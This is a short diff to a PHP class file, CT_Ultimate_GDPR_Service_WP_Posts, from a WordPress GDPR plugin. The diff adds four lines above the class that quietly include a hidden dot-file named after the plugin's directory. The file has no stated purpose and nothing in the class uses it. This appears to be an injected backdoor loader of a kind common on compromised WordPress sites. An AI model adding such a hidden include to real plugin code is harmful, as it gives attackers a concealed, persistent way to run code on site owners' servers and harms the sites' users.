@@ -3,6 +3,10 @@
 /**
  * Interface CT_Ultimate_GDPR_Service_WP_Posts
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class CT_Ultimate_GDPR_Service_WP_Posts extends CT_Ultimate_GDPR_Service_Abstract {
 
 	/**
